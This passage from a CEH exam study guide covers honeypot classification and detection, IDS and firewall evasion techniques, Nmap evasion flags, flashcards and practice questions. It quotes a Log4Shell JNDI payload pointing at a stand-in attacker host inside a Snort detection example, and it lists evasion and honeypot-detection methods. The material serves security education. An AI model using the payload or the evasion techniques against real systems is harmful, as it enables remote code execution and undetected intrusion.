| **High-interaction** | Full OS and real services | Study advanced attacker behavior; capture zero-days | Real servers with monitoring; ManTrap |

### Honeypot Classification by Purpose

| Type | Description |
|------|-------------|
| **Production honeypot** | Deployed inside the production network to detect attacks early. Low-interaction, easy to maintain. |
| **Research honeypot** | Deployed to study attacker behavior, collect malware, analyze new attack techniques. High-interaction, complex to maintain. |

### Honeynet

A **honeynet** is a network of honeypots that simulates a real network. It includes routers, firewalls, multiple servers, and workstations — all monitored. A honeynet provides a more realistic environment than a single honeypot.

### Honeypot Detection Techniques

Attackers try to detect honeypots to avoid them. The CEH exam tests how attackers identify honeypots.

| Detection Method | How It Works |
|-----------------|-------------|
| **Probe response analysis** | Honeypots often have limited or scripted responses. Sending unexpected input and analyzing the response can reveal emulation. |
| **Service fingerprinting** | Low-interaction honeypots emulate services imperfectly. Detailed service fingerprinting reveals differences from real services. |
| **Timing analysis** | Honeypot responses may have different timing characteristics (faster or slower than real services). |
| **VMware MAC detection** | Many honeypots run in VMware. VMware virtual NICs use MAC prefixes: 00:0C:29, 00:50:56, or 00:05:69. Detecting these MACs suggests a virtual environment (possibly a honeypot). |
| **Send-Safe Honeypot Hunter** | A tool that probes SMTP servers to determine if they are honeypots. It sends test emails and analyzes server behavior. |
| **TCP/IP stack fingerprinting** | Honeypots may have a different TCP/IP stack than the OS they claim to run. nmap -O can reveal inconsistencies. |
| **Network traffic analysis** | A honeypot with no legitimate traffic but many connections is suspicious. Real servers have varied traffic patterns. |

### Key Honeypot Tools

| Tool | Type | Description |
|------|------|-------------|
| **KFSensor** | Low-interaction (Windows) | Windows-based honeypot that emulates services and detects intrusion attempts |
| **Honeyd** | Low-interaction | Creates virtual hosts on a network; can simulate multiple OS fingerprints |
| **Cowrie** | Medium-interaction (SSH/Telnet) | Captures brute-force credentials and shell interactions |
| **Dionaea** | Medium-interaction | Captures malware samples; emulates SMB, HTTP, FTP, MSSQL services |
| **Conpot** | Medium-interaction (ICS/SCADA) | Emulates industrial control systems |
| **T-Pot** | Multi-honeypot platform | Docker-based platform combining multiple honeypots with ELK visualization |
| **Glastopf** | Web application honeypot | Emulates vulnerable web applications to capture web attacks |

### VMware MAC Address Detection (Exam-Critical)

| VMware MAC Prefix | Product |
|-------------------|---------|
| 00:0C:29 | VMware virtual NIC (most common) |
| 00:50:56 | VMware manually set or ESXi |
| 00:05:69 | VMware older products |

```bash
# Check if a host is running in VMware by examining ARP cache
arp -a | grep -i "00:0c:29"

# Nmap can also detect VMware
nmap -sV --script=vmware-version 192.168.1.1
```

> **Exam tip:** If a question asks how an attacker detects a honeypot running in a virtual machine, look for answers mentioning **MAC address** analysis. VMware MAC prefixes are a dead giveaway.

## 2.9 Additional IDS/Firewall Evasion Techniques

### Encryption and Tunneling

| Technique | Description |
|-----------|-------------|
| **SSH tunneling** | Tunnel attack traffic through an encrypted SSH connection. The IDS cannot inspect encrypted content. |
| **VPN tunneling** | Encapsulate malicious traffic inside a VPN tunnel. |
| **SSL/TLS encryption** | Use HTTPS for command-and-control traffic. IDS cannot inspect without SSL interception. |
| **DNS tunneling** | Encode data in DNS queries and responses to bypass firewalls (port 53 is almost always allowed). |
| **ICMP tunneling** | Hide data in ICMP echo request/reply payloads to bypass firewalls. |

### Protocol-Based Evasion

| Technique | Description |
|-----------|-------------|
| **HTTP tunneling** | Encapsulate non-HTTP traffic inside HTTP to bypass firewalls that allow port 80/443 |
| **Using allowed protocols** | Route attack traffic through protocols the firewall allows (DNS, HTTP, HTTPS) |
| **Source port manipulation** | Set source port to 53 (DNS), 80 (HTTP), or 443 (HTTPS) — firewalls often allow return traffic from these ports |

### Timing-Based Evasion

| Technique | Description |
|-----------|-------------|
| **Slow scan** | Send probes with long delays between them to avoid triggering rate-based IDS thresholds |
| **Randomized scan** | Randomize the order of scanned ports/hosts |
| **Time-based payload delivery** | Deliver fragments of the attack payload at intervals longer than the IDS session timeout |

### Evasion Summary Table

| Evasion Technique | Evades IDS? | Evades Firewall? | How? |
|-------------------|-------------|-------------------|------|
| Fragmentation | Yes | Partially | IDS may fail to reassemble; packet filters may pass fragments |
| Session splicing | Yes | No | IDS may fail to reassemble TCP stream |
| Obfuscation/encoding | Yes (signature-based) | No | Encoded payload does not match IDS signatures |
| TTL manipulation | Yes | No | IDS sees different traffic than the target |
| Decoy scanning | Yes | No | Real attacker hidden among decoy IPs |
| Encryption/tunneling | Yes | Yes (if tunnel protocol is allowed) | IDS cannot inspect encrypted content; firewall allows the tunnel protocol |
| Source port spoofing | No | Yes | Firewall allows traffic from trusted ports |
| Slow timing | Yes | No | Falls below IDS detection thresholds |
| ACK scan | No | Yes (stateless FW) | Stateless firewalls do not track connection state |
| Firewalking | N/A | Maps rules | Determines which ports the firewall allows |

---

## Day 4 Quick-Review Flashcard Table

| Topic | Key Fact |
|-------|---------|
| Session hijacking vs. spoofing | Hijacking = take over existing session; Spoofing = pretend to be someone new |
| Application-level hijacking | Steals session tokens (cookies, URL params); works at HTTP layer |
| Network-level hijacking | Manipulates TCP sequence numbers; works at TCP/IP layer |
| ISN prediction | Predict TCP Initial Sequence Number to inject packets into a session |
| RST hijacking | Send spoofed RST to terminate victim's connection, then take over |
| Blind hijacking | Inject packets without seeing responses (no sniffing capability) |
| UDP hijacking | Easier than TCP — no sequence numbers; attacker must respond faster than real server |
| Session fixation | Attacker forces victim to use a known session ID, then uses it after victim authenticates |
| Session donation | Attacker tricks victim into using attacker's session to capture victim's data |
| CRIME attack | Exploits TLS compression to recover cookies by observing compressed size changes |
| Man-in-the-Browser | Trojan inside browser modifies transactions in real-time (e.g., Zeus) |
| Countermeasure: session fixation | Regenerate session ID after authentication |
| NIDS vs. HIDS | NIDS monitors network traffic; HIDS monitors host activity |
| Signature-based IDS | Matches known patterns; cannot detect zero-day attacks |
| Anomaly-based IDS | Detects deviations from baseline; can detect zero-day but more false positives |
| IDS vs. IPS | IDS detects/alerts; IPS detects/alerts/blocks |
| Packet filtering firewall | Stateless; Layer 3-4; examines headers only |
| Stateful firewall | Tracks connection state; more secure than packet filtering |
| NGFW | Combines firewall + IPS + app awareness + deep packet inspection |
| Nmap -sA | ACK scan — maps firewall rules (filtered vs. unfiltered) |
| Nmap -sF, -sN, -sX | FIN/NULL/Xmas scans — evade SYN-based firewalls; do not work on Windows |
| Nmap -D | Decoy scan — hide among fake source IPs |
| Nmap -T0 | Paranoid timing — 5-minute delay between probes |
| Nmap --source-port 53 | Spoof source port as DNS — firewalls may allow |
| Nmap -f | Fragment packets into 8-byte fragments |
| Firewalking | Determine firewall rules by sending packets with TTL that expires past the firewall |
| Snort rule action | alert, log, pass, drop, reject, sdrop |
| Snort content | Pattern match in packet payload |
| Snort flags:FPU | Match Xmas scan (FIN+PSH+URG) |
| YARA rules | Pattern matching for malware identification |
| yarGen | Automatically generates YARA rules from malware samples |
| Low-interaction honeypot | Emulates services; detects scans; easy to deploy |
| High-interaction honeypot | Real OS/services; captures advanced attacks; complex |
| VMware MAC prefixes | 00:0C:29, 00:50:56, 00:05:69 — used to detect VM-based honeypots |
| Send-Safe Honeypot Hunter | Tool to detect SMTP honeypots |
| DNS tunneling | Encode data in DNS queries to bypass firewalls |

---

## Day 4 Exam-Style Practice Questions

**Question 1:** An attacker captures the session cookie of a user who is logged into a web application over an unencrypted Wi-Fi network. The attacker then uses this cookie to access the application as the victim. What type of attack is this?

A. Session fixation
B. Session sidejacking (hijacking)
C. Cross-site scripting
D. Man-in-the-browser

**Answer: B.** Session sidejacking (also called session hijacking or cookie hijacking) involves capturing a valid session cookie over an unencrypted network and using it to impersonate the user. Session fixation (A) requires the attacker to set the session ID before the victim logs in. XSS (C) involves injecting scripts. MitB (D) requires a trojan inside the browser.

---

**Question 2:** A penetration tester wants to determine which ports a firewall allows through. The tester knows the firewall is 3 hops away. Which technique should the tester use?

A. ACK scanning
B. Firewalking
C. FIN scanning
D. Decoy scanning

**Answer: B.** Firewalking sends packets with TTL set to expire one hop past the firewall. If the packet passes through the firewall and the TTL expires, the tester receives an ICMP Time Exceeded reply, indicating the port is allowed. ACK scanning (A) can determine if a port is filtered but does not identify specific firewall rules. FIN scanning (C) is an evasion technique, not a firewall mapping technique. Decoy scanning (D) hides the scanner's IP among decoys.

---

**Question 3:** Examine the following Snort rule:

```
alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:"Possible Log4Shell Exploit Attempt"; flow:established,to_server; content:"jndi:"; nocase; content:"ldap://"; nocase; distance:0; sid:1000010; rev:1; classtype:attempted-admin; priority:1;)
```

What does this rule detect?

A. SQL injection targeting port 443
B. Log4Shell (Log4j) exploitation attempts on HTTPS traffic
C. LDAP brute force attacks
D. Directory traversal on web servers

**Answer: B.** The rule looks for "jndi:" followed by "ldap://" in TCP traffic to port 443, which is the signature of a Log4Shell (CVE-2021-44228) exploit attempt. The ${jndi:ldap://attacker.com/exploit} payload triggers remote code execution in vulnerable Log4j instances.

---

**Question 4:** An attacker wants to scan a target network without revealing their IP address. The attacker has identified a host (10.0.0.50) with an IP ID that increments predictably. Which Nmap scan type should the attacker use?

A. nmap -sS 192.168.1.0/24
B. nmap -sI 10.0.0.50 192.168.1.0/24
C. nmap -D RND:10 192.168.1.0/24
D. nmap -sA 192.168.1.0/24

**Answer: B.** The idle scan (-sI) uses a zombie host with a predictable IP ID to scan the target. The attacker's IP address never appears in the target's logs — only the zombie's IP. Decoy scanning (C) includes the attacker's real IP among decoys; idle scanning completely hides it.

---

**Question 5:** Which IDS detection method can detect zero-day attacks that have no known signature?

A. Signature-based detection
B. Anomaly-based detection
C. Protocol analysis
D. Pattern matching

**Answer: B.** Anomaly-based (behavior-based) detection establishes a baseline of normal behavior and flags deviations. Since zero-day attacks have no existing signatures, signature-based detection (A) and pattern matching (D) cannot detect them. Protocol analysis (C) can detect protocol violations but not all zero-day attacks.

---

**Question 6:** Which of the following is the BEST countermeasure against session fixation attacks?

A. Implement HTTPS for all pages
B. Set the HttpOnly flag on session cookies
C. Regenerate the session ID after successful authentication
D. Set a short session timeout

**Answer: C.** Session fixation works because the server does not change the session ID after login. If the session ID is regenerated after authentication, the attacker's pre-set session ID becomes invalid. HTTPS (A) prevents sniffing but not fixation. HttpOnly (B) prevents JavaScript access but not fixation. Short timeout (D) limits the attack window but does not prevent it.

---

**Question 7:** A security analyst observes that an IDS is not detecting malicious HTTP requests that contain URL-encoded attack payloads. What type of evasion technique is the attacker using?

A. Fragmentation
B. Session splicing
C. Obfuscation/encoding
D. TTL manipulation

**Answer: C.** Obfuscation/encoding (such as URL encoding, Unicode encoding, or double encoding) transforms the attack payload so it does not match IDS signatures. The web server decodes the payload and processes the attack, but the IDS sees only the encoded version. Fragmentation (A) splits packets at the IP layer. Session splicing (B) splits at the TCP layer. TTL manipulation (D) uses packet TTL to show different traffic to the IDS than the target.

---

**Question 8:** An attacker discovers that a target system has the MAC address 00:0C:29:AB:CD:EF. What does this suggest?

A. The target is running a Linux operating system
B. The target is a VMware virtual machine
C. The target is a Cisco router
D. The target is using a VPN

**Answer: B.** The MAC prefix 00:0C:29 is assigned to VMware. This indicates the target is a virtual machine, possibly a honeypot. The attacker may choose to avoid this system or investigate further.
